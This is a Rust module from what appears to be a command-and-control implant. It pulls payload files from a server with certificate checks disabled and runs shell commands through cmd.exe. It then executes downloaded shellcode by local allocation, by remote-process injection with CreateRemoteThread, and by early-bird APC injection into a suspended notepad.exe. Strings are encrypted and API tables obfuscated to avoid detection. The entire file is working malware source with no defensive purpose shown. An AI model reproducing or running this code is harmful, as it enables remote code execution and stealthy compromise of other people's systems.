pub mod command {
    use crate::obfwin::Constants::*;
    use crate::obfwin::Functions::*;
    use litcrypt::lc;
    use std::ptr::{null, null_mut};

    fn get_file_vec(
        base_url: &str,
        file_name: &str,
        cookie_header: &reqwest::header::HeaderValue,
    ) -> Vec<u8> {
        // First need to get the file from the server
        let file_url = base_url.to_owned() + &lc!("/recipes/download/") + file_name;

        let client = reqwest::blocking::ClientBuilder::new()
            .danger_accept_invalid_certs(true)
            .build()
            .unwrap();

        let mut headers = reqwest::header::HeaderMap::new();
        headers.insert(reqwest::header::COOKIE, cookie_header.clone());

        let file_response = client
            .get(file_url)
            .headers(headers.clone())
            .send()
            .unwrap();

        let file_vec: Vec<u8> = file_response.bytes().unwrap().into();
        return file_vec;
    }

    pub fn shell(shell_str: &str) -> String {
        let output = std::process::Command::new("cmd.exe")
            .arg("/c")
            .arg(shell_str.to_owned() + " 2>&1")
            .stdout(std::process::Stdio::piped())
            .stderr(std::process::Stdio::inherit())
            .output()
            .expect(&lc!("Failed to execute command"));

        String::from_utf8_lossy(&output.stdout).to_string()
    }

    pub fn shellcode_spawn(
        base_url: &str,
        cookie_header: &reqwest::header::HeaderValue,
        file_name: &str,
        memory_permissions: &str,
    ) -> String {
        // Get the file off the server
        let file_vec = get_file_vec(base_url, file_name, cookie_header);

        let file_bytes: &[u8] = &file_vec;
        let file_size = file_bytes.len();

        let mut old_perms = PAGE_READWRITE;

        unsafe {
            let kernel32 = &*OBF_KERNEL32;
            let ntdll = &*OBF_NTDLL;

            // If specified to use RW memory, allocate, copy, change to RX, execute
            if memory_permissions == "RW" {
                // Allocate some RW
                let dest = (kernel32.VirtualAlloc)(
                    null(),
                    file_size,
                    MEM_COMMIT | MEM_RESERVE,
                    PAGE_READWRITE,
                );
                // Copy the shellcode in there
                (ntdll.RtlMoveMemory)(dest, file_bytes.as_ptr().cast(), file_size);
                // Re-protect as exec-read
                (kernel32.VirtualProtect)(dest, file_size, PAGE_EXECUTE_READ, old_perms);
                // Run the shellcode
                let handle = (kernel32.CreateThread)(null(), 0, dest, null(), 0, null_mut());
            } else {
                // RWX by default, allocate, copy, execute
                // Allocate some RWX
                let dest = (kernel32.VirtualAlloc)(
                    null(),
                    file_size,
                    MEM_COMMIT | MEM_RESERVE,
                    PAGE_EXECUTE_READWRITE,
                );
                // Copy the shellcode in there
                (ntdll.RtlMoveMemory)(dest, file_bytes.as_ptr().cast(), file_size);
                // Run the shellcode
                let handle = (kernel32.CreateThread)(null(), 0, dest, null(), 0, null_mut());
            }
        }
        lc!("Shellcode successfully executed")
    }

    pub fn shellcode_inject(
        base_url: &str,
        cookie_header: &reqwest::header::HeaderValue,
        file_name: &str,
        target_pid: u32,
        memory_permissions: &str,
    ) -> String {
        // Get the file off the server
        let file_vec = get_file_vec(base_url, file_name, cookie_header);

        let file_bytes: &[u8] = &file_vec;
        let file_size = file_bytes.len();

        unsafe {
            // Get the kernel32 library
            let kernel32 = &*OBF_KERNEL32;

            // Get a handle on the target process
            let handle = (kernel32.OpenProcess)(
                PROCESS_CREATE_THREAD
                    | PROCESS_QUERY_INFORMATION
                    | PROCESS_VM_OPERATION
                    | PROCESS_VM_READ
                    | PROCESS_VM_WRITE,
                FALSE,
                target_pid,
            );

            // If specified to use RW memory, allocate, copy, change to RX, execute
            if memory_permissions == "RW" {
                let mut old_perm = PAGE_READWRITE;

                // Allocate inside of the target pid process
                let dest = (kernel32.VirtualAllocEx)(
                    handle,
                    null(),
                    file_size,
                    MEM_COMMIT,
                    PAGE_READWRITE,
                );
                // Write memory inside of targed pid
                (kernel32.WriteProcessMemory)(
                    handle,
                    dest,
                    file_bytes.as_ptr().cast(),
                    file_size,
                    null_mut(),
                );
                // Re-protect it as PAGE_EXECUTE_READ
                (kernel32.VirtualProtectEx)(
                    handle,
                    dest,
                    file_size,
                    PAGE_EXECUTE_READ,
                    &mut old_perm,
                );
                // Spawn the thread
                (kernel32.CreateRemoteThread)(handle, null(), 0, dest, null(), 0, null_mut());
            } else {
                // Allocate inside of the target pid process
                let dest = (kernel32.VirtualAllocEx)(
                    handle,
                    null(),
                    file_size,
                    MEM_COMMIT,
                    PAGE_EXECUTE_READWRITE,
                );
                // Write memory inside of targed pid
                (kernel32.WriteProcessMemory)(
                    handle,
                    dest,
                    file_bytes.as_ptr().cast(),
                    file_size,
                    null_mut(),
                );
                // Spawn the thread
                (kernel32.CreateRemoteThread)(handle, null(), 0, dest, null(), 0, null_mut());
            }

            (kernel32.CloseHandle)(handle);
        }
        lc!("Shellcode successfully executed")
    }

    pub fn shellcode_earlybird(
        base_url: &str,
        cookie_header: &reqwest::header::HeaderValue,
        file_name: &str,
        memory_permissions: &str,
    ) -> String {
        // Get the file off the server
        let file_vec = get_file_vec(base_url, file_name, cookie_header);

        let file_bytes: &[u8] = &file_vec;
        let file_size = file_bytes.len();

        unsafe {
   
            let kernel32 = &*OBF_KERNEL32;

            let mut old_perm = PAGE_READWRITE;

            // Fingers crossed custom STARTUPINFOA works
            let mut si: STARTUPINFOA = std::mem::zeroed();
            si.cb = 96;
            let mut pi: PROCESS_INFORMATION = std::mem::zeroed();

            let c_ptr_to_program_to_start = b"notepad.exe\0";
            let ptr_si: *const i8 = std::mem::transmute(&si);
            let ptr_pi: *const i8 = std::mem::transmute(&pi);

            let result = (kernel32.CreateProcessA)(null(), c_ptr_to_program_to_start.as_ptr().cast(), null(), null(), 0, CREATE_SUSPENDED, null(), null(), ptr_si, ptr_pi);

            // If specified to use RW memory, allocate, copy, change to RX, execute
            if memory_permissions == "RW" {
                let dest = (kernel32.VirtualAllocEx)(
                    pi.hProcess,
                    null(),
                    file_size,
                    MEM_COMMIT,
                    PAGE_READWRITE,
                );
                _ = (kernel32.WriteProcessMemory)(
                    pi.hProcess,
                    dest,
                    file_bytes.as_ptr().cast(),
                    file_size,
                    null_mut(),
                );
                _ = (kernel32.VirtualProtectEx)(
                    pi.hProcess,
                    dest,
                    file_size,
                    PAGE_EXECUTE_READ,
                    &mut old_perm,
                );
                _ = (kernel32.QueueUserAPC)(
                    dest,
                    pi.hThread,
                    null()
                );
                _ = (kernel32.ResumeThread)(pi.hThread);
            } else { // Just allocate RWX and copy into it
                let dest = (kernel32.VirtualAllocEx)(
                    pi.hProcess,
                    null(),
                    file_size,
                    MEM_COMMIT,
                    PAGE_EXECUTE_READWRITE,
                );
                _ = (kernel32.WriteProcessMemory)(
                    pi.hProcess,
                    dest,
                    file_bytes.as_ptr().cast(),
                    file_size,
                    null_mut(),
                );
                _ = (kernel32.QueueUserAPC)(
                    dest,
                    pi.hThread,
                    null()
                );
                _ = (kernel32.ResumeThread)(pi.hThread);
            }

            lc!("Successfully spawned notepad.exe and injected the requested shellcode")
        }

    }

    pub fn kill(
        kill_id: &str
    ) -> String {
        
        // Send back the kill_id

        return kill_id.to_string();
    }
}
